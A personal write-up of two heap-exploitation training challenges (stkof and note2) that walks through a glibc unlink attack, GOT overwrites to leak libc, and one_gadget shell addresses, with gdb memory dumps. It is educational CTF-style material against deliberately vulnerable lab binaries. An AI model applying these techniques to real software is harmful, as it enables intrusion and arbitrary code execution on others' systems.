# unlink

This section contains illustrations of the unlink exploit, described in `08_heap/01_exploits_examples/04_unlink`.

# stkof

```bash
❯ file stkof
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
```

```bash
❯ pwn checksec stkof
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Seems to ask for an input, and displays `FAIL` a number of time. Upon analysis with ghidra, the logic is a bit cryptic but here is what it does:
* `1`: allocate with a `malloc` a pointer (which size we can request !) and append it to an array of such pointers. The base of the array seems to be at `DAT_00602140`, while the current size is `DAT_00602100`. It will also print the value of `DAT_00602100`.
* `2`: read an input from the user. First asks for an index to edit, then if it is allocated we give again the index of the section we want to write to. Then we read until we got to the length we specified (and there is probably a little bound check bug here).
* `3`: free an index we specify. If it was allocated, it will free it and set it to null.
* `4`: I don't really get this one. If the index we give was allocated and the length of the string is less than 4, it will display `//TODO` else `...`. Maybe overwrite `puts` got entry ?

I first tried to see if I can conduct a double free (with my own libc-2.31), without success. After that, I resorted to follow the tutorial, by using a unlink exploit (with libc-2.23).

To do the unlink exploit, one has to craft a fake chunk that will be correct enough so that it will be unlinked. The `correct enough` part comprises three parts:
* correct fw/bk pointers
* correct size metadata
* fd next size checks pass (or we avoid them by setting it to 0x0)

As per the tutorial I started creating helper methods to interact with the executable. One of the issue I met was with the `read` helper, where I put more string value than I intended to. As a result, the remaining string would then be fed to the option selection, which would give me `FAIL` messages.

The fake chunk will have to reproduce the following structure:
```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

The gadget that will be used by the exploit is given by:
```bash
one_gadget libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
The conditions for the first two does not seem to be fulfilled. The remaining two seem to work.

As for how all of this work I have not wrapped my head around it yet. I can see that after the free there is our forged entry in the list of pointers:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x00000000010a4020
0x602150:	0x00000000010a44e0	0x00000000010a4590
0x602160:	0x0000000000602148	0x00000000010a46f0  <-- here
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
```

Then after the following `read` call:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030  <-- got address of strlen
0x602150:	0x0000000000602070	0x00000000010a4590  <-- got address of malloc
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
```
We can see that we used the pointer we inserted with our `free` exploit to write two other pointers in the list of pointers.

The next call to `read` will overwrite what is pointed by the first pointer (i.e. strlen's got address) with the one for `puts`.

Before:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030
0x602150:	0x0000000000602070	0x00000000010a4590
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
gef➤  x 0x0000000000602030
0x602030 <strlen@got.plt>:	0x0000000000400786
gef➤  x 0x0000000000400786
0x400786 <strlen@plt+6>:	0xffb0e90000000368
```
After:
```
gef➤  x/10g 0x00602140
0x602140:	0x0000000000000000	0x0000000000602030
0x602150:	0x0000000000602070	0x00000000010a4590
0x602160:	0x0000000000602148	0x0000000000000000
0x602170:	0x00000000010a47a0	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
gef➤  x 0x0000000000602030
0x602030 <strlen@got.plt>:	0x0000000000400760
gef➤  x 0x0000000000400760
0x400760 <puts@plt>:	0x0168002018ba25ff
```
So from now on when we call `strlen` we are calling `puts` instead !

Then when we do the `leak` call, the code is going to check the length of the data pointed by the ith pointer. However, the 2nd pointer is pointing at the got address of malloc, and the length check is now replaced with `puts`. So we get the address of malloc.

From now on the rest is quite easy: we compute the base for libc from the leak, and we deduce the address for our gadget. We then put our gadget in the place of `malloc` by overwriting it's got entry (remember, it's the second entry in our pointer list). The next time we call `malloc`, it will trigger our gadget instead.

Unfortunatly the exploit ended with a:
```
$ ls
ls: ./libc-2.23.so: version `GLIBC_2.30' not found (required by /lib/x86_64-linux-gnu/libselinux.so.1)
```
I guess if I execute `stkof` in a machine with a native libc2.23 env and attach remotely the pwn program I would be able to pop a shell.

# note2

```bash
❯ file note2
note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=46dca2e49f923813b316f12858e7e0f42e4a82c3, stripped
❯ pwn checksec note2
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Seems to work like the previous `stkof` exercise, by offering the user several option to create, edit or delete entries.

## New note

A buffer is malloc'ed with a size provided by the user (max 0x81), and saved in the data region:
```
DAT_00602120 // list of buffer pointers
DAT_00602140 // list of buffer(/note) length
DAT_00602160 // number of notes
```
The id of a note is the number of notes - 1 (i.e. starts from 0). There seems to be a maximum of 4 notes. The length of the note must take in account the last null byte (len: 5, note: "hello" => will become "hell").

Also, the note's content seems to be cleaned from '%', probably to avoid leaks with printf.

## Show note

Will show the content of the note at an index provided by the user (bounded by 0 <= index < 4). The selected buffer/note needs to be not null to display anything.

## Edit note

To edit a note it must:
* have at least one note, or else it will display "Please add a note!"
* have a valid index (0 <= index < 4)
* exist (i.e buffer is not null)

I can then overwrite it or append to it. It will display "TheNewContents:" (which is stored in the same buffer that will receive the user's input), then cancatenate and copy around the user's input. Note that the input buffer is malloc'ed, with a size of 0xa0.

## Delete note

This one is quite straightforward: it will free the selected buffer and set the corresponding length entry to 0.

The only strange thing I noted is the absence of decrementation of the number of notes variable.

## Exploit

Now let's try to exploit this thing. Since it is an exercise about unlink, I will probably have to create all notes, then edit one to insert a fake chunk and free one to trigger an unlink exploit. That should give me a pointer to wherever I like, an I will probably overwrite a got entry or the like and put a gadget instead.

As for the potential gadget, I have:
```bash
❯ one_gadget libc-2.23.so
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Initially I tried to edit the first note in order to overwrite the `previous used` bit and `previous size` of the next memory chunk. However I was not able to (I received a sigsev), so I followed the tutorial's example to delete the second note (id 1), the create another one again with the same size, and overwrite the memory fields of the third note:
```
0x1061010:	0x0000000000000000	0x00000000000000a0  <-- first note
0x1061020:	0x0000000000602108	0x0000000000602110
0x1061030:	0x0000000000000000	0x0000000000000000
0x1061040:	0x0000000000000000	0x0000000000000000
0x1061050:	0x0000000000000000	0x0000000000000000
0x1061060:	0x0000000000000000	0x0000000000000000
0x1061070:	0x0000000000000000	0x0000000000000000
0x1061080:	0x0000000000000000	0x0000000000000000
0x1061090:	0x0000000000000000	0x0000000000000021  <-- second note metadata (after deletion then reallocation, so is it the fourth note now ?)
0x10610a0:	0x3535353535353535	0x3535353535353535  <-- second note
0x10610b0:	0x00000000000000a0	0x0000000000000090  <-- third note metadata (overwritten)
```

Deleting the third note will then trigger the unlink attack, and will give us a pointer in the pointer list:
```
0x602120:	0x0000000000602108	0x0000000000000000  <-- first and second note pointers
0x602130:	0x0000000001de70c0	0x0000000001de70a0  <-- third and fourth note pointers
```

Then we will overwrite again this entry at 0x602120 in order to leak an address with `show_note`. The tutorial chose `atoi`, I'll try with `strlen`.

Or so I thought... Since I'll have to trigger the gadget by calling the overwritten method, it is far more elegant to overwrite `atoi`, since it will be called anyway.

As with the previous exercise, I was not able to call `ls` in the popped shell, probably because of a dependence itself depending on my host's libc.